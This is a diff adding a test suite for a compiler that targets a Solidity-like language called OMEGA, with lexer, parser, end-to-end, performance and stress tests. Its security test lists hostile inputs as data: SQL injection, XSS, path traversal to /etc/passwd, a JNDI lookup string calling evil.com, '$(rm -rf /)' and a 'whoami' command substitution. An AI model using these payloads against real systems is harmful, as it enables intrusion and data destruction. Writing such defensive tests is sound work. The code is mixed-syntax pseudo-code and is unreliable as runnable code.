@@ -1,0 +1,696 @@
+// OMEGA Comprehensive Testing & Validation System
+// Complete test suite for functionality, security, and performance validation
+
+blockchain OmegaTestingSuite {
+    state {
+        TestRegistry test_registry;
+        TestRunner test_runner;
+        TestReporter test_reporter;
+        CoverageAnalyzer coverage_analyzer;
+        TestConfiguration config;
+        TestMetrics metrics;
+        ValidationEngine validator;
+    }
+
+    constructor() {
+        _initialize_testing_framework();
+        _setup_test_categories();
+        _configure_test_environments();
+    }
+
+    // Main testing interface
+    function run_comprehensive_test_suite() public returns (TestSuiteReport) {
+        TestSuiteReport report = TestSuiteReport::new();
+        
+        // 1. Unit Tests
+        report.unit_tests = run_unit_tests();
+        
+        // 2. Integration Tests
+        report.integration_tests = run_integration_tests();
+        
+        // 3. End-to-End Tests
+        report.e2e_tests = run_end_to_end_tests();
+        
+        // 4. Security Tests
+        report.security_tests = run_security_tests();
+        
+        // 5. Performance Tests
+        report.performance_tests = run_performance_tests();
+        
+        // 6. Stress Tests
+        report.stress_tests = run_stress_tests();
+        
+        // 7. Cross-Platform Tests
+        report.cross_platform_tests = run_cross_platform_tests();
+        
+        // 8. Regression Tests
+        report.regression_tests = run_regression_tests();
+        
+        // 9. Code Coverage Analysis
+        report.coverage_analysis = analyze_code_coverage();
+        
+        // 10. Generate comprehensive report
+        report.overall_result = _calculate_overall_result(report);
+        report.test_summary = _generate_test_summary(report);
+        
+        return report;
+    }
+
+    // Unit Tests
+    function run_unit_tests() public returns (UnitTestResults) {
+        UnitTestResults results = UnitTestResults::new();
+        
+        // Lexer unit tests
+        results.lexer_tests = run_lexer_unit_tests();
+        
+        // Parser unit tests
+        results.parser_tests = run_parser_unit_tests();
+        
+        // Semantic analyzer unit tests
+        results.semantic_tests = run_semantic_unit_tests();
+        
+        // Code generator unit tests
+        results.codegen_tests = run_codegen_unit_tests();
+        
+        // Optimizer unit tests
+        results.optimizer_tests = run_optimizer_unit_tests();
+        
+        // Utility function tests
+        results.utility_tests = run_utility_unit_tests();
+        
+        return results;
+    }
+
+    function run_lexer_unit_tests() private returns (ComponentTestResults) {
+        ComponentTestResults results = ComponentTestResults::new();
+        
+        // Test 1: Basic token recognition
+        TestCase test1 = TestCase({
+            name: "Basic Token Recognition",
+            description: "Test recognition of basic OMEGA tokens",
+            input: "blockchain MyContract { state { uint256 value; } }",
+            expected_output: "BLOCKCHAIN IDENTIFIER LBRACE STATE LBRACE UINT256 IDENTIFIER SEMICOLON RBRACE RBRACE",
+            category: TestCategory.UNIT
+        });
+        
+        TestResult result1 = _run_lexer_test(test1);
+        results.add_result(result1);
+        
+        // Test 2: String literal handling
+        TestCase test2 = TestCase({
+            name: "String Literal Handling",
+            description: "Test proper handling of string literals with escapes",
+            input: "string message = \"Hello\\nWorld\\t!\";",
+            expected_output: "STRING IDENTIFIER ASSIGN STRING_LITERAL SEMICOLON",
+            category: TestCategory.UNIT
+        });
+        
+        TestResult result2 = _run_lexer_test(test2);
+        results.add_result(result2);
+        
+        // Test 3: Number literal recognition
+        TestCase test3 = TestCase({
+            name: "Number Literal Recognition",
+            description: "Test recognition of various number formats",
+            input: "uint256 a = 123; uint256 b = 0x1F; uint256 c = 1.5e10;",
+            expected_output: "UINT256 IDENTIFIER ASSIGN NUMBER_LITERAL SEMICOLON UINT256 IDENTIFIER ASSIGN HEX_LITERAL SEMICOLON UINT256 IDENTIFIER ASSIGN FLOAT_LITERAL SEMICOLON",
+            category: TestCategory.UNIT
+        });
+        
+        TestResult result3 = _run_lexer_test(test3);
+        results.add_result(result3);
+        
+        // Test 4: Comment handling
+        TestCase test4 = TestCase({
+            name: "Comment Handling",
+            description: "Test proper handling of single-line and multi-line comments",
+            input: "// Single line comment\n/* Multi-line\n   comment */ uint256 value;",
+            expected_output: "UINT256 IDENTIFIER SEMICOLON",
+            category: TestCategory.UNIT
+        });
+        
+        TestResult result4 = _run_lexer_test(test4);
+        results.add_result(result4);
+        
+        // Test 5: Error handling for invalid tokens
+        TestCase test5 = TestCase({
+            name: "Invalid Token Error Handling",
+            description: "Test error handling for invalid characters",
+            input: "uint256 value = @#$;",
+            expected_output: "ERROR",
+            category: TestCategory.UNIT
+        });
+        
+        TestResult result5 = _run_lexer_test(test5);
+        results.add_result(result5);
+        
+        return results;
+    }
+
+    function run_parser_unit_tests() private returns (ComponentTestResults) {
+        ComponentTestResults results = ComponentTestResults::new();
+        
+        // Test 1: Basic blockchain declaration
+        TestCase test1 = TestCase({
+            name: "Basic Blockchain Declaration",
+            description: "Test parsing of basic blockchain structure",
+            input: "blockchain SimpleContract { state { uint256 value; } constructor() { value = 0; } }",
+            expected_output: "AST: BlockchainDeclaration(SimpleContract, StateBlock([VariableDeclaration(uint256, value)]), Constructor([Assignment(value, 0)]))",
+            category: TestCategory.UNIT
+        });
+        
+        TestResult result1 = _run_parser_test(test1);
+        results.add_result(result1);
+        
+        // Test 2: Function declaration parsing
+        TestCase test2 = TestCase({
+            name: "Function Declaration Parsing",
+            description: "Test parsing of function declarations with parameters and return types",
+            input: "function transfer(address to, uint256 amount) public returns (bool) { return true; }",
+            expected_output: "AST: FunctionDeclaration(transfer, [Parameter(address, to), Parameter(uint256, amount)], public, bool, [ReturnStatement(true)])",
+            category: TestCategory.UNIT
+        });
+        
+        TestResult result2 = _run_parser_test(test2);
+        results.add_result(result2);
+        
+        // Test 3: Expression parsing
+        TestCase test3 = TestCase({
+            name: "Complex Expression Parsing",
+            description: "Test parsing of complex mathematical expressions",
+            input: "uint256 result = (a + b) * c / d - e % f;",
+            expected_output: "AST: VariableDeclaration(uint256, result, BinaryExpression(-, BinaryExpression(/, BinaryExpression(*, BinaryExpression(+, a, b), c), d), BinaryExpression(%, e, f)))",
+            category: TestCategory.UNIT
+        });
+        
+        TestResult result3 = _run_parser_test(test3);
+        results.add_result(result3);
+        
+        // Test 4: Control flow parsing
+        TestCase test4 = TestCase({
+            name: "Control Flow Parsing",
+            description: "Test parsing of if-else and loop statements",
+            input: "if (condition) { doSomething(); } else { doSomethingElse(); } for (uint256 i = 0; i < 10; i++) { process(i); }",
+            expected_output: "AST: [IfStatement(condition, Block([FunctionCall(doSomething)]), Block([FunctionCall(doSomethingElse)])), ForLoop(VariableDeclaration(uint256, i, 0), BinaryExpression(<, i, 10), UnaryExpression(++, i), Block([FunctionCall(process, [i])]))]",
+            category: TestCategory.UNIT
+        });
+        
+        TestResult result4 = _run_parser_test(test4);
+        results.add_result(result4);
+        
+        // Test 5: Error recovery
+        TestCase test5 = TestCase({
+            name: "Parser Error Recovery",
+            description: "Test parser's ability to recover from syntax errors",
+            input: "blockchain Test { state { uint256 value } function test() { value = 1; } }", // Missing semicolon
+            expected_output: "ERROR: Missing semicolon at line 1, column 35",
+            category: TestCategory.UNIT
+        });
+        
+        TestResult result5 = _run_parser_test(test5);
+        results.add_result(result5);
+        
+        return results;
+    }
+
+    // Integration Tests
+    function run_integration_tests() public returns (IntegrationTestResults) {
+        IntegrationTestResults results = IntegrationTestResults::new();
+        
+        // Test lexer-parser integration
+        results.lexer_parser_integration = test_lexer_parser_integration();
+        
+        // Test parser-semantic integration
+        results.parser_semantic_integration = test_parser_semantic_integration();
+        
+        // Test semantic-codegen integration
+        results.semantic_codegen_integration = test_semantic_codegen_integration();
+        
+        // Test full compilation pipeline
+        results.full_pipeline_integration = test_full_compilation_pipeline();
+        
+        return results;
+    }
+
+    function test_lexer_parser_integration() private returns (IntegrationTestResult) {
+        IntegrationTestResult result = IntegrationTestResult::new();
+        
+        // Test complete source code processing
+        string memory source_code = `
+            blockchain TokenContract {
+                state {
+                    mapping(address => uint256) balances;
+                    uint256 total_supply;
+                    string name;
+                }
+                
+                constructor(string _name, uint256 _supply) {
+                    name = _name;
+                    total_supply = _supply;
+                    balances[msg.sender] = _supply;
+                }
+                
+                function transfer(address to, uint256 amount) public returns (bool) {
+                    require(balances[msg.sender] >= amount, "Insufficient balance");
+                    balances[msg.sender] -= amount;
+                    balances[to] += amount;
+                    emit Transfer(msg.sender, to, amount);
+                    return true;
+                }
+                
+                event Transfer(address indexed from, address indexed to, uint256 value);
+            }
+        `;
+        
+        try {
+            // Tokenize
+            Token[] memory tokens = _tokenize(source_code);
+            
+            // Parse
+            AST ast = _parse(tokens);
+            
+            // Verify AST structure
+            bool ast_valid = _validate_ast_structure(ast);
+            
+            result.success = ast_valid;
+            result.message = ast_valid ? "Integration successful" : "AST validation failed";
+            
+        } catch (Exception e) {
+            result.success = false;
+            result.message = string.concat("Integration failed: ", e.message);
+        }
+        
+        return result;
+    }
+
+    // End-to-End Tests
+    function run_end_to_end_tests() public returns (E2ETestResults) {
+        E2ETestResults results = E2ETestResults::new();
+        
+        // Test complete compilation workflows
+        results.evm_compilation = test_evm_end_to_end();
+        results.solana_compilation = test_solana_end_to_end();
+        results.cross_chain_compilation = test_cross_chain_end_to_end();
+        
+        return results;
+    }
+
+    function test_evm_end_to_end() private returns (E2ETestResult) {
+        E2ETestResult result = E2ETestResult::new();
+        
+        string memory omega_source = `
+            blockchain SimpleToken {
+                state {
+                    mapping(address => uint256) balances;
+                    uint256 total_supply;
+                }
+                
+                constructor(uint256 _supply) {
+                    total_supply = _supply;
+                    balances[msg.sender] = _supply;
+                }
+                
+                function transfer(address to, uint256 amount) public returns (bool) {
+                    require(balances[msg.sender] >= amount);
+                    balances[msg.sender] -= amount;
+                    balances[to] += amount;
+                    return true;
+                }
+            }
+        `;
+        
+        try {
+            // Compile to EVM
+            CompilationResult compilation_result = _compile_to_evm(omega_source);
+            
+            if (!compilation_result.success) {
+                result.success = false;
+                result.message = "Compilation failed";
+                return result;
+            }
+            
+            // Verify generated Solidity code
+            bool solidity_valid = _validate_generated_solidity(compilation_result.output);
+            
+            // Test deployment simulation
+            bool deployment_successful = _simulate_evm_deployment(compilation_result.output);
+            
+            result.success = solidity_valid && deployment_successful;
+            result.message = result.success ? "E2E test passed" : "E2E test failed";
+            result.generated_code_size = bytes(compilation_result.output).length;
+            result.compilation_time = compilation_result.compilation_time;
+            
+        } catch (Exception e) {
+            result.success = false;
+            result.message = string.concat("E2E test error: ", e.message);
+        }
+        
+        return result;
+    }
+
+    // Security Tests
+    function run_security_tests() public returns (SecurityTestResults) {
+        SecurityTestResults results = SecurityTestResults::new();
+        
+        // Input validation tests
+        results.input_validation = test_input_validation_security();
+        
+        // Code injection tests
+        results.code_injection = test_code_injection_prevention();
+        
+        // Buffer overflow tests
+        results.buffer_overflow = test_buffer_overflow_protection();
+        
+        // Access control tests
+        results.access_control = test_access_control_mechanisms();
+        
+        return results;
+    }
+
+    function test_input_validation_security() private returns (SecurityTestResult) {
+        SecurityTestResult result = SecurityTestResult::new();
+        
+        // Test malicious input patterns
+        string[] memory malicious_inputs = [
+            "'; DROP TABLE users; --",
+            "<script>alert('xss')</script>",
+            "../../../etc/passwd",
+            "${jndi:ldap://evil.com/a}",
+            "$(rm -rf /)",
+            "`whoami`",
+            "\\x00\\x01\\x02",
+            "A" * 1000000 // Very long string
+        ];
+        
+        uint256 blocked_count = 0;
+        
+        for (uint256 i = 0; i < malicious_inputs.length; i++) {
+            try {
+                _compile_source(malicious_inputs[i]);
+                // If compilation succeeds, check if input was properly sanitized
+            } catch (SecurityException e) {
+                blocked_count++;
+            } catch (Exception e) {
+                // Other exceptions are acceptable for malicious input
+                blocked_count++;
+            }
+        }
+        
+        result.success = blocked_count == malicious_inputs.length;
+        result.vulnerability_count = malicious_inputs.length - blocked_count;
+        result.message = string.concat("Blocked ", uint_to_string(blocked_count), " out of ", uint_to_string(malicious_inputs.length), " malicious inputs");
+        
+        return result;
+    }
+
+    // Performance Tests
+    function run_performance_tests() public returns (PerformanceTestResults) {
+        PerformanceTestResults results = PerformanceTestResults::new();
+        
+        // Compilation speed tests
+        results.compilation_speed = test_compilation_performance();
+        
+        // Memory usage tests
+        results.memory_usage = test_memory_performance();
+        
+        // Throughput tests
+        results.throughput = test_throughput_performance();
+        
+        // Scalability tests
+        results.scalability = test_scalability_performance();
+        
+        return results;
+    }
+
+    function test_compilation_performance() private returns (PerformanceTestResult) {
+        PerformanceTestResult result = PerformanceTestResult::new();
+        
+        // Test with various project sizes
+        ProjectSize[] memory sizes = [ProjectSize.SMALL, ProjectSize.MEDIUM, ProjectSize.LARGE];
+        
+        for (uint256 i = 0; i < sizes.length; i++) {
+            string memory project = _generate_test_project(sizes[i]);
+            
+            uint256 start_time = _get_timestamp();
+            CompilationResult compilation_result = _compile_project(project);
+            uint256 end_time = _get_timestamp();
+            
+            uint256 compilation_time = end_time - start_time;
+            uint256 lines_of_code = _count_lines_of_code(project);
+            uint256 lines_per_second = lines_of_code * 1000 / compilation_time;
+            
+            result.measurements.push(PerformanceMeasurement({
+                project_size: sizes[i],
+                compilation_time: compilation_time,
+                lines_per_second: lines_per_second,
+                memory_used: compilation_result.memory_used
+            }));
+        }
+        
+        // Check if performance meets targets
+        result.meets_targets = _check_performance_targets(result.measurements);
+        
+        return result;
+    }
+
+    // Stress Tests
+    function run_stress_tests() public returns (StressTestResults) {
+        StressTestResults results = StressTestResults::new();
+        
+        // High load tests
+        results.high_load = test_high_load_scenarios();
+        
+        // Memory pressure tests
+        results.memory_pressure = test_memory_pressure();
+        
+        // Concurrent compilation tests
+        results.concurrent_compilation = test_concurrent_compilation();
+        
+        // Resource exhaustion tests
+        results.resource_exhaustion = test_resource_exhaustion();
+        
+        return results;
+    }
+
+    function test_high_load_scenarios() private returns (StressTestResult) {
+        StressTestResult result = StressTestResult::new();
+        
+        // Simulate high compilation load
+        uint256 concurrent_compilations = 100;
+        uint256 successful_compilations = 0;
+        uint256 failed_compilations = 0;
+        
+        for (uint256 i = 0; i < concurrent_compilations; i++) {
+            try {
+                string memory source = _generate_random_source_code();
+                CompilationResult compilation_result = _compile_source(source);
+                
+                if (compilation_result.success) {
+                    successful_compilations++;
+                } else {
+                    failed_compilations++;
+                }
+            } catch (Exception e) {
+                failed_compilations++;
+            }
+        }
+        
+        result.success_rate = (successful_compilations * 100) / concurrent_compilations;
+        result.failure_rate = (failed_compilations * 100) / concurrent_compilations;
+        result.passed = result.success_rate >= 95; // 95% success rate required
+        
+        return result;
+    }
+
+    // Code Coverage Analysis
+    function analyze_code_coverage() public returns (CoverageAnalysis) {
+        CoverageAnalysis analysis = CoverageAnalysis::new();
+        
+        // Collect coverage data from all tests
+        CoverageData coverage_data = coverage_analyzer.collect_coverage_data();
+        
+        // Calculate coverage metrics
+        analysis.line_coverage = _calculate_line_coverage(coverage_data);
+        analysis.branch_coverage = _calculate_branch_coverage(coverage_data);
+        analysis.function_coverage = _calculate_function_coverage(coverage_data);
+        analysis.statement_coverage = _calculate_statement_coverage(coverage_data);
+        
+        // Identify uncovered code
+        analysis.uncovered_lines = _identify_uncovered_lines(coverage_data);
+        analysis.uncovered_branches = _identify_uncovered_branches(coverage_data);
+        analysis.uncovered_functions = _identify_uncovered_functions(coverage_data);
+        
+        // Overall coverage score
+        analysis.overall_coverage = _calculate_overall_coverage(analysis);
+        
+        return analysis;
+    }
+
+    // Test Result Validation
+    function validate_test_results(TestSuiteReport report) public returns (ValidationResult) {
+        ValidationResult validation = ValidationResult::new();
+        
+        // Check minimum coverage requirements
+        if (report.coverage_analysis.overall_coverage < config.minimum_coverage_threshold) {
+            validation.add_issue("Code coverage below minimum threshold");
+        }
+        
+        // Check critical test failures
+        if (report.security_tests.has_critical_failures()) {
+            validation.add_issue("Critical security test failures detected");
+        }
+        
+        // Check performance requirements
+        if (!report.performance_tests.meets_requirements()) {
+            validation.add_issue("Performance requirements not met");
+        }
+        
+        // Check regression test results
+        if (report.regression_tests.has_regressions()) {
+            validation.add_issue("Regression tests detected issues");
+        }
+        
+        validation.is_valid = validation.issues.length == 0;
+        
+        return validation;
+    }
+
+    // Automated Test Generation
+    function generate_additional_tests(TestSuiteReport report) public returns (GeneratedTestSuite) {
+        GeneratedTestSuite generated = GeneratedTestSuite::new();
+        
+        // Generate tests for uncovered code
+        if (report.coverage_analysis.overall_coverage < 100) {
+            generated.coverage_tests = _generate_coverage_tests(report.coverage_analysis);
+        }
+        
+        // Generate edge case tests
+        generated.edge_case_tests = _generate_edge_case_tests();
+        
+        // Generate property-based tests
+        generated.property_tests = _generate_property_based_tests();
+        
+        return generated;
+    }
+}
+
+// Test data structures
+struct TestSuiteReport {
+    UnitTestResults unit_tests;
+    IntegrationTestResults integration_tests;
+    E2ETestResults e2e_tests;
+    SecurityTestResults security_tests;
+    PerformanceTestResults performance_tests;
+    StressTestResults stress_tests;
+    CrossPlatformTestResults cross_platform_tests;
+    RegressionTestResults regression_tests;
+    CoverageAnalysis coverage_analysis;
+    TestResult overall_result;
+    TestSummary test_summary;
+    uint256 total_tests_run;
+    uint256 tests_passed;
+    uint256 tests_failed;
+    uint256 tests_skipped;
+    uint256 execution_time;
+}
+
+struct TestCase {
+    string name;
+    string description;
+    string input;
+    string expected_output;
+    TestCategory category;
+    Priority priority;
+    string[] tags;
+}
+
+struct TestResult {
+    string test_name;
+    bool passed;
+    string message;
+    uint256 execution_time;
+    string actual_output;
+    string expected_output;
+    string error_details;
+}
+
+struct ComponentTestResults {
+    TestResult[] results;
+    uint256 passed_count;
+    uint256 failed_count;
+    uint256 total_execution_time;
+    
+    function add_result(TestResult result) public {
+        results.push(result);
+        if (result.passed) {
+            passed_count++;
+        } else {
+            failed_count++;
+        }
+        total_execution_time += result.execution_time;
+    }
+}
+
+enum TestCategory {
+    UNIT,
+    INTEGRATION,
+    E2E,
+    SECURITY,
+    PERFORMANCE,
+    STRESS,
+    REGRESSION
+}
+
+// Utility functions for testing
+function _run_lexer_test(TestCase test) private returns (TestResult) {
+    TestResult result = TestResult({
+        test_name: test.name,
+        passed: false,
+        message: "",
+        execution_time: 0,
+        actual_output: "",
+        expected_output: test.expected_output,
+        error_details: ""
+    });
+    
+    uint256 start_time = _get_timestamp();
+    
+    try {
+        Token[] memory tokens = _tokenize(test.input);
+        result.actual_output = _tokens_to_string(tokens);
+        result.passed = _compare_strings(result.actual_output, test.expected_output);
+        result.message = result.passed ? "Test passed" : "Output mismatch";
+    } catch (Exception e) {
+        result.passed = false;
+        result.message = "Test failed with exception";
+        result.error_details = e.message;
+    }
+    
+    result.execution_time = _get_timestamp() - start_time;
+    
+    return result;
+}
+
+function uint_to_string(uint256 value) private pure returns (string memory) {
+    if (value == 0) {
+        return "0";
+    }
+    
+    uint256 temp = value;
+    uint256 digits;
+    
+    while (temp != 0) {
+        digits++;
+        temp /= 10;
+    }
+    
+    bytes memory buffer = new bytes(digits);
+    
+    while (value != 0) {
+        digits -= 1;
+        buffer[digits] = bytes1(uint8(48 + uint256(value % 10)));
+        value /= 10;
+    }
+    
+    return string(buffer);
+}
